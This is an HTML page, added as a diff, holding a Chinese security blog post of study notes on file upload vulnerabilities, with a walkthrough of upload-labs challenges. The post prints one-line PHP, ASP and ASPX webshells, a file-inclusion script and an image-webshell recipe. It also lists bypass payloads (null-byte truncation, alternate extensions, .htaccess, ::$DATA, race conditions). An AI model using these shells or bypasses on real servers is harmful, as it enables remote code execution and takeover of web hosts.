@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>文件上传漏洞 | Yoghurt</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="什么的是文件上传漏洞？上传一个可执行的脚本文件，从而可以执行服务器端命令 什么叫webshell？webshell简称网页后门是运行在web应用之上的远程控制程序，其实就是一张网页，具有文件管理，端口扫描，提权，获取系统信息等功能。 一句话木马PHP：&lt;?php @eval($_POST[&quot;&quot;])?&gt;asp:&lt;% eval request(&quot;k&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞">
+<meta property="og:url" content="http://example.com/2022/04/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Yoghurt">
+<meta property="og:description" content="什么的是文件上传漏洞？上传一个可执行的脚本文件，从而可以执行服务器端命令 什么叫webshell？webshell简称网页后门是运行在web应用之上的远程控制程序，其实就是一张网页，具有文件管理，端口扫描，提权，获取系统信息等功能。 一句话木马PHP：&lt;?php @eval($_POST[&quot;&quot;])?&gt;asp:&lt;% eval request(&quot;k&amp;qu">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.328888.xyz/2022/04/15/i5ZoR.png">
+<meta property="article:published_time" content="2022-04-11T00:48:46.718Z">
+<meta property="article:modified_time" content="2022-04-15T07:40:56.004Z">
+<meta property="article:author" content="GXY BLOG">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.328888.xyz/2022/04/15/i5ZoR.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Yoghurt" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.1"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">GXY BLOG</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">myblog</a></li>
+				        
+							<li><a href="/archives">overview</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">myblog</a></li>
+		        
+					<li><a href="/archives">overview</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2022-04-11T00:48:46.718Z" itemprop="datePublished">2022-04-11</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      文件上传漏洞
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="什么的是文件上传漏洞？"><a href="#什么的是文件上传漏洞？" class="headerlink" title="什么的是文件上传漏洞？"></a>什么的是文件上传漏洞？</h2><p>上传一个可执行的脚本文件，从而可以执行服务器端命令</p>
+<h2 id="什么叫webshell？"><a href="#什么叫webshell？" class="headerlink" title="什么叫webshell？"></a>什么叫webshell？</h2><p>webshell简称网页后门是运行在web应用之上的远程控制程序，其实就是一张网页，具有文件管理，端口扫描，提权，获取系统信息等功能。</p>
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>PHP：<code>&lt;?php @eval($_POST[&quot;&quot;])?&gt;</code><br>asp:<code>&lt;% eval request(&quot;k&quot;)%&gt; </code><br>aspx:<code> &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;</code><br>注：@：屏蔽错误<br>    eval():php函数，用于解析字符串形式的代码<br>    $_POST[x]：获取post请求参数中x的值</p>
+<h2 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h2><p>中国菜刀，中国蚁剑，冰蝎，哥斯拉</p>
+<h3 id="蚁剑安装"><a href="#蚁剑安装" class="headerlink" title="蚁剑安装"></a>蚁剑安装</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41924764/article/details/108099952?utm_source=app&app_version=5.1.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">详见</a></p>
+<h3 id="冰蝎安装"><a href="#冰蝎安装" class="headerlink" title="冰蝎安装"></a>冰蝎安装</h3><p>github搜索下载运行.jar<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106221602?utm_source=app&app_version=5.1.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">详见</a></p>
+<h3 id="将木马文件（与服务器相对应）上传到目标服务器，知道其位置，然后去访问"><a href="#将木马文件（与服务器相对应）上传到目标服务器，知道其位置，然后去访问" class="headerlink" title="将木马文件（与服务器相对应）上传到目标服务器，知道其位置，然后去访问"></a>将木马文件（与服务器相对应）上传到目标服务器，知道其位置，然后去访问</h3><h2 id="webshell变形"><a href="#webshell变形" class="headerlink" title="webshell变形"></a>webshell变形</h2><h2 id="文件上传的机制"><a href="#文件上传的机制" class="headerlink" title="文件上传的机制"></a>文件上传的机制</h2><ul>
+<li>客户端JavaScript验证</li>
+<li>服务端MIME类型验证</li>
+<li>服务端文件扩展名验证（ 黑名单、 白名单 ）</li>
+<li>服务器文件内容验证 （ 文件头(文件幻数) 、文件加载检测 ）</li>
+</ul>
+<h2 id="绕过客户端js验证的方法"><a href="#绕过客户端js验证的方法" class="headerlink" title="绕过客户端js验证的方法"></a>绕过客户端js验证的方法</h2><ul>
+<li>修改关键的检测函数</li>
+<li>直接通过插件禁用js（JavaScript Switcher，NoScript）</li>
+<li>burp抓包修改报文内容<br>（所有前端的验证机制都是不安全的，因为前端的东西是用户可控制的）</li>
+</ul>
+<h2 id="绕过服务端MIME类型验证"><a href="#绕过服务端MIME类型验证" class="headerlink" title="绕过服务端MIME类型验证"></a>绕过服务端MIME类型验证</h2><h3 id="MIIME是什么？"><a href="#MIIME是什么？" class="headerlink" title="MIIME是什么？"></a>MIIME是什么？</h3><p>MIME即文件类型检测<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
+<p>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>利用Burp抓包，将报文中的Content-Type改成允许的类型</p>
+<h2 id="绕过服务器文件扩展名验证"><a href="#绕过服务器文件扩展名验证" class="headerlink" title="绕过服务器文件扩展名验证"></a>绕过服务器文件扩展名验证</h2><ul>
+<li>后缀名大小写绕过</li>
+<li>修改后缀名绕过</li>
+<li> 重写绕过</li>
+<li>特殊可解析后缀绕过（在某些特定环境中某些特殊后缀名仍会被当做PHP文件解析。phplphp2/php3/php4lphp5/php6lphp7/phtlphtm/phtml）</li>
+<li> .htaccess绕过</li>
+<li> 利用操作系统特性-windos<br>（详见upload过关笔记）<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3>00截断通常用来绕过web软waf的白名单限制<br>00截断是操作系统层的漏洞<br>这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。</li>
+</ul>
+<p>1.在文件名中插入空字符进行00截断，只适合前端绕过，后端绕过无效。<br>具体如：filename=test.php%00.txt<br>2.文件上传是在后缀检测合格后拼接路径和文件名<br>具体如：如果抓到的包中存在path: uploads/，就可以直接把路径构造成uploads/xxx.php%00</p>
+<p>0x00和00%00<br>它们最终的结果都是一样的，都代表着chr(0)，即空字符，只不过使用的位置不同，0x00代表16进制的空字符00，需要在HEX中改为00，进行截断，而%00是URL解码之前的字符，它被解码成16进制ASCII码之后实际上也是0x00，所以它们最终都对应的是空字符，这里%00可以用在URL中如xx.php?filename=test.php%00.txt，也可以直接插在Burp包中的路径中，如path=shell.jsp%00.txt</p>
+<h2 id="绕过服务器文件内容验证-文件头"><a href="#绕过服务器文件内容验证-文件头" class="headerlink" title="绕过服务器文件内容验证-文件头"></a>绕过服务器文件内容验证-文件头</h2><h3 id="文件幻数"><a href="#文件幻数" class="headerlink" title="文件幻数"></a>文件幻数</h3><p>图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。<br>常见文件幻数<br>JPG: FF D8 FF EO 00 10 4A 46 49 46.<br>GIF:47 49 46 3839 61(GIF89a).<br>PNG:89 50 4E 47</p>
+<p>给上传脚本加上相应的幻数头字节就可以，php引擎会将GIF89a的内容当作html文本<br>如：GIF89a<?php phpinfo()?><br>但是直接访问并不能将gif当作php来解析,因此还需要利用文件包含漏洞，写一个include.php传入，再利用它来解析图片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset-utf-8*);</span><br><span class="line">＄file= $GETI&#x27;file&#x27;]</span><br><span class="line">if (isset($file))&#123;</span><br><span class="line">include $file;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">show source( file_);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="图片木马（文件包含漏洞）"><a href="#图片木马（文件包含漏洞）" class="headerlink" title="图片木马（文件包含漏洞）"></a>图片木马（文件包含漏洞）</h3><p>文件包含漏洞：可以将图片格式的文件当做PHP文件来执行</p>
+<ul>
+<li>准备一张较小的gif格式的图片，上传burp抓包，将一句话木马插入到乱码中</li>
+<li>输入系统指令：<code>copy 一张图片.png/b+一句话木马.php/a 生成图片名称.png</code></li>
+</ul>
+<h4 id="在本地搭建任意文件包含"><a href="#在本地搭建任意文件包含" class="headerlink" title="在本地搭建任意文件包含"></a>在本地搭建任意文件包含</h4><p>PHP中文件包含的函数：</p>
+<p>require() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</p>
+<p>require_once() // 如果一个文件已经被包含过，则不会在包含它</p>
+<p>include() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</p>
+<p>include_once() // 如果一个文件已经被包含过，则不会在包含它</p>
+<p>当使用这些函数包含一个新文件时，改文件将作为PHP代码执行</p>
+<p>代码：<code>&lt;?php $file=$_GET[&#39;file&#39;];include($file);?&gt; </code><br>本地文件路径：http://本机IP/../include.php?file=</p>
+<h1 id="upload闯关"><a href="#upload闯关" class="headerlink" title="upload闯关"></a>upload闯关</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>在前端改，将判断条件删除</p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>只验证Content-type<br>在后端改，burp抓包，将png后缀改为.php</p>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>黑名单绕过<br>burp抓包，将png改为.php4</p>
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>burp抓包，先上传一个.htaccess（注意要抓包后将文件名删除只留后缀）然后在上传包含一句话木马的文件（.png）</p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><ul>
+<li>是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</li>
+<li>htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</li>
+<li>htaccess的用途范围主要针对当前目录。<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2>大小写绕过<br>上传.PHP<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2>空格绕过<br>burp抓包，将png改为.php (在PHP后加一个空格)<h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2>点绕过<br>burp抓包，将png改为.php.(在PHP后加一个点，这是Windows的特性：会自动去掉后缀名中最后的”.”，它本身存在的漏洞)</li>
+</ul>
+<h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>::$DATA绕过（Windows的特性会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名）<br>burp抓包，将png改为.php::$DATA </p>
+<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>点+空格+点绕过<br>代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名<br>burp抓包，将png改为.php. .(在php后加点空格点)</p>
+<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>双写绕过<br>burp抓包，将png改为.phphpp（双写绕过）</p>
+<h2 id="十一关"><a href="#十一关" class="headerlink" title="十一关"></a>十一关</h2><p>00截断：<a target="_blank" rel="noopener" href="https://tatsumaki.cn/2020/07/29/00jieduan/">https://tatsumaki.cn/2020/07/29/00jieduan/</a><br>上传.png等合格文件，burp抓包，在第一行save-path路径后面加文件名改为php后缀和%00<br>如：POST /Pass-11/index.php?save_path=../upload/a.php%00 HTTP/1.1</p>
+<h2 id="十二关"><a href="#十二关" class="headerlink" title="十二关"></a>十二关</h2><p>00截断<br>上传1.php (加一个空格用于占位)，burp抓包，打开hex将20改为00（空格的十六进制为20）<br>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。由于无法自行解码所以我们需要在hex中找到相对应的位置将数字修改为00.</p>
+<h2 id="十三关"><a href="#十三关" class="headerlink" title="十三关"></a>十三关</h2><p>图片木马<br>利用文件包含漏洞<br>上传一个小的GIF，burp抓包，将<?php phpinfo();?>加在后面，然后发包，然后访问<a target="_blank" rel="noopener" href="http://158.247.233.5:27277/include.php?file=upload/3320220412065937.gif%EF%BC%88%E8%87%AA%E5%B7%B1%E6%8B%BC%E6%8E%A5%EF%BC%89">http://158.247.233.5:27277/include.php?file=upload/3320220412065937.gif（自己拼接）</a><br>文件包含漏洞</p>
+<h2 id="十四关"><a href="#十四关" class="headerlink" title="十四关"></a>十四关</h2><p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-13<br>在图片码中加入gif的文件头，然后利用文件包含来读取</p>
+<h2 id="十五关"><a href="#十五关" class="headerlink" title="十五关"></a>十五关</h2><p>php_exif模块来判断文件类型，用图片马绕过,同pass-13</p>
+<h2 id="十六关"><a href="#十六关" class="headerlink" title="十六关"></a>十六关</h2><p>同上</p>
+<h2 id="十七关"><a href="#十七关" class="headerlink" title="十七关"></a>十七关</h2><p>二次渲染绕过<br>二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符/图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败.<br>图片马可以上传但是却没有解析，因为二次渲染把PHP代码删掉了<br>把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。（比较工具：HxD Hex Editor）</p>
+<h2 id="十八关"><a href="#十八关" class="headerlink" title="十八关"></a>十八关</h2><h3 id="条件竞争是什么？"><a href="#条件竞争是什么？" class="headerlink" title="条件竞争是什么？"></a>条件竞争是什么？</h3><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关<br>操作顺序设计的不合理时，将会导致此类问题的发生<br>原理<br>上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后扌进行判断：如果文件格式符合要求，则重命名，<br>如果文件格式不符合要求，将文件刪除<br>由于服务器并发处理（同时）多个请求，<br>假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a<br>用户上传的文件，<br>会有以下三种情况：<br>1.访问时间点在上传成功之前，没有此文件<br>2.访问时间点在刚上传成功但还没有进行判断，<br>该文件存在<br>13.访问时间点在判断之后，文件被删除，没有此文件</p>
+<p>直接上传一个php文件，然后进行抓包，将数据包发送至intruder下，清空变量，修改payload type为null payloads，再修改线程，number of threads为20，然后发包，用另一个浏览器一直访问18.php地址，只要在上传的一瞬间，他还没来的及删除、修改就可以了</p>
+<h2 id="十九关"><a href="#十九关" class="headerlink" title="十九关"></a>十九关</h2><ul>
+<li>00截断，同上<br>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.</li>
+<li>或者burp抓包，将upload-19.jpg改为upload-19.php/.</li>
+</ul>
+<h2 id="二十关"><a href="#二十关" class="headerlink" title="二十关"></a>二十关</h2><p>数组绕过验证<br><img src="https://s1.328888.xyz/2022/04/15/i5ZoR.png"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/23/SQLi-Labs%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SQLI-LABS闯关笔记</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2022 GXY BLOG
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
